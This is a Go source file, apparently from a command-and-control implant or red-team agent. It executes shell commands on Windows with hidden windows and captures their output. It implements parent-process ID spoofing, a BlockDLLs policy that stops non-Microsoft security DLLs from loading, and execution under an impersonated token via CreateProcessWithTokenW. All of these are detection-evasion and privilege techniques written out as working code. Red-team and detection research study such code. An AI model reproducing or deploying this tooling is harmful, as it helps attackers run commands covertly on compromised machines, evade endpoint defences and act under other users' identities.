//go:build windows
// +build windows

package commands

import (
	"fmt"
	"os/exec"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")

// executeRunCommand runs a shell command, using CreateProcessWithTokenW
// when an impersonation token is active. Returns (output, error).
func executeRunCommand(cmdLine string) (string, error) {
	tokenMutex.Lock()
	token := gIdentityToken
	tokenMutex.Unlock()

	if token == 0 {
		ppid := defaultPPID
		if blockDLLsEnabled || ppid > 0 {
			return runWithExtendedAttrs("cmd.exe /c "+cmdLine, ppid, blockDLLsEnabled)
		}
		// No impersonation, no BlockDLLs, no PPID — use standard exec.Command
		cmd := exec.Command("cmd.exe", "/c", cmdLine)
		output, err := cmd.CombinedOutput()
		return string(output), err
	}

	return runWithToken(token, "cmd.exe /c "+cmdLine)
}

// runWithExtendedAttrs creates a child process with optional PPID spoofing and/or BlockDLLs mitigation.
// Uses CreateProcessW with STARTUPINFOEX to apply extended process attributes.
func runWithExtendedAttrs(cmdLine string, ppid int, blockDLLs bool) (string, error) {
	// Create pipe for stdout/stderr capture
	var stdoutRead, stdoutWrite windows.Handle
	var sa windows.SecurityAttributes
	sa.Length = uint32(unsafe.Sizeof(sa))
	sa.InheritHandle = 1

	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe: %v", err)
	}
	defer windows.CloseHandle(stdoutRead)

	// Prevent read handle from being inherited by child
	windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0)

	// Count attributes needed
	attrCount := 0
	if ppid > 0 {
		attrCount++
	}
	if blockDLLs {
		attrCount++
	}
	if attrCount == 0 {
		attrCount = 1 // shouldn't happen but safety
	}

	// Set up proc thread attribute list
	var attrListSize uintptr
	procInitializeProcThreadAttributeList.Call(0, uintptr(attrCount), 0, uintptr(unsafe.Pointer(&attrListSize)))

	attrListBuf := make([]byte, attrListSize)
	attrList := (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(&attrListBuf[0]))

	ret, _, err := procInitializeProcThreadAttributeList.Call(
		uintptr(unsafe.Pointer(attrList)), uintptr(attrCount), 0,
		uintptr(unsafe.Pointer(&attrListSize)),
	)
	if ret == 0 {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("InitializeProcThreadAttributeList: %v", err)
	}
	defer procDeleteProcThreadAttributeList.Call(uintptr(unsafe.Pointer(attrList)))

	// PPID spoofing
	var parentHandle windows.Handle
	if ppid > 0 {
		hParent, errOpen := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, uint32(ppid))
		if errOpen != nil {
			// Fall back to normal execution without PPID spoofing
			windows.CloseHandle(stdoutWrite)
			if blockDLLs {
				// Retry with only BlockDLLs
				return runWithExtendedAttrs(cmdLine, 0, true)
			}
			// No attributes needed, fall back to exec.Command
			cmd := exec.Command("cmd.exe", "/c", cmdLine)
			output, execErr := cmd.CombinedOutput()
			return string(output), execErr
		}
		parentHandle = hParent
		defer windows.CloseHandle(parentHandle)

		ret, _, err = procUpdateProcThreadAttribute.Call(
			uintptr(unsafe.Pointer(attrList)), 0,
			uintptr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
			uintptr(unsafe.Pointer(&parentHandle)),
			unsafe.Sizeof(parentHandle), 0, 0,
		)
		if ret == 0 {
			windows.CloseHandle(stdoutWrite)
			return "", fmt.Errorf("UpdateProcThreadAttribute (PPID): %v", err)
		}
	}

	// BlockDLLs mitigation
	if blockDLLs {
		mitigationPolicy := uint64(PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON)
		ret, _, err = procUpdateProcThreadAttribute.Call(
			uintptr(unsafe.Pointer(attrList)), 0,
			uintptr(PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY),
			uintptr(unsafe.Pointer(&mitigationPolicy)),
			unsafe.Sizeof(mitigationPolicy), 0, 0,
		)
		if ret == 0 {
			windows.CloseHandle(stdoutWrite)
			return "", fmt.Errorf("UpdateProcThreadAttribute (BlockDLLs): %v", err)
		}
	}

	var siEx STARTUPINFOEX
	siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
	siEx.StartupInfo.Flags = uint32(syscall.STARTF_USESTDHANDLES | syscall.STARTF_USESHOWWINDOW)
	siEx.StartupInfo.ShowWindow = uint16(syscall.SW_HIDE)
	siEx.StartupInfo.StdOutput = windows.Handle(stdoutWrite)
	siEx.StartupInfo.StdError = windows.Handle(stdoutWrite)
	siEx.AttributeList = attrList

	var pi PROCESS_INFORMATION

	cmdUTF16, cmdErr := syscall.UTF16PtrFromString(cmdLine)
	if cmdErr != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("invalid command: %v", cmdErr)
	}

	creationFlags := uint32(CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT)
	ret, _, err = procCreateProcessW.Call(
		0,
		uintptr(unsafe.Pointer(cmdUTF16)),
		0, 0,
		1, // bInheritHandles = TRUE (for pipe)
		uintptr(creationFlags),
		0, 0,
		uintptr(unsafe.Pointer(&siEx)),
		uintptr(unsafe.Pointer(&pi)),
	)

	// Close write end so we detect EOF when child exits
	windows.CloseHandle(stdoutWrite)

	if ret == 0 {
		return "", fmt.Errorf("CreateProcessW: %v", err)
	}

	defer windows.CloseHandle(pi.Process)
	defer windows.CloseHandle(pi.Thread)

	// Read output
	var output strings.Builder
	buf := make([]byte, 4096)
	for {
		var n uint32
		readErr := windows.ReadFile(stdoutRead, buf, &n, nil)
		if readErr != nil || n == 0 {
			break
		}
		output.Write(buf[:n])
		if output.Len() > 10*1024*1024 {
			output.WriteString("\n[output truncated at 10MB]")
			break
		}
	}

	// Wait for completion (30s timeout)
	event, _ := windows.WaitForSingleObject(pi.Process, 30000)
	if event == uint32(syscall.WAIT_TIMEOUT) {
		windows.TerminateProcess(pi.Process, 1)
		return output.String(), fmt.Errorf("process timed out after 30s")
	}

	var exitCode uint32
	windows.GetExitCodeProcess(pi.Process, &exitCode)
	if exitCode != 0 {
		return output.String(), fmt.Errorf("exit status %d", exitCode)
	}

	return output.String(), nil
}

// runWithToken creates a child process using CreateProcessWithTokenW,
// which only requires SE_IMPERSONATE_NAME (held by admin users).
// CreateProcessAsUser requires SE_ASSIGNPRIMARYTOKEN_NAME (only SYSTEM).
func runWithToken(token windows.Token, cmdLine string) (string, error) {
	// Create pipe for stdout/stderr capture
	var stdoutRead, stdoutWrite windows.Handle
	var sa windows.SecurityAttributes
	sa.Length = uint32(unsafe.Sizeof(sa))
	sa.InheritHandle = 1

	if err := windows.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0); err != nil {
		return "", fmt.Errorf("CreatePipe: %v", err)
	}
	defer windows.CloseHandle(stdoutRead)

	// Prevent read handle from being inherited by child
	windows.SetHandleInformation(stdoutRead, windows.HANDLE_FLAG_INHERIT, 0)

	var si syscall.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = syscall.STARTF_USESTDHANDLES | syscall.STARTF_USESHOWWINDOW
	si.ShowWindow = syscall.SW_HIDE
	si.StdOutput = syscall.Handle(stdoutWrite)
	si.StdErr = syscall.Handle(stdoutWrite)

	var pi syscall.ProcessInformation

	cmdUTF16, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		windows.CloseHandle(stdoutWrite)
		return "", fmt.Errorf("invalid command: %v", err)
	}

	ret, _, callErr := procCreateProcessWithTokenW.Call(
		uintptr(token),
		1, // LOGON_WITH_PROFILE
		0, // lpApplicationName
		uintptr(unsafe.Pointer(cmdUTF16)),
		uintptr(CREATE_NO_WINDOW),
		0, // lpEnvironment
		0, // lpCurrentDirectory
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	// Close write end so we detect EOF when child exits
	windows.CloseHandle(stdoutWrite)

	if ret == 0 {
		return "", fmt.Errorf("CreateProcessWithTokenW: %v", callErr)
	}

	defer syscall.CloseHandle(pi.Process)
	defer syscall.CloseHandle(pi.Thread)

	// Read output
	var output strings.Builder
	buf := make([]byte, 4096)
	for {
		var n uint32
		err := windows.ReadFile(stdoutRead, buf, &n, nil)
		if err != nil || n == 0 {
			break
		}
		output.Write(buf[:n])
		if output.Len() > 10*1024*1024 {
			output.WriteString("\n[output truncated at 10MB]")
			break
		}
	}

	// Wait for completion (30s timeout)
	event, _ := syscall.WaitForSingleObject(pi.Process, 30000)
	if event == syscall.WAIT_TIMEOUT {
		syscall.TerminateProcess(pi.Process, 1)
		return output.String(), fmt.Errorf("process timed out after 30s")
	}

	var exitCode uint32
	syscall.GetExitCodeProcess(pi.Process, &exitCode)
	if exitCode != 0 {
		return output.String(), fmt.Errorf("exit status %d", exitCode)
	}

	return output.String(), nil
}
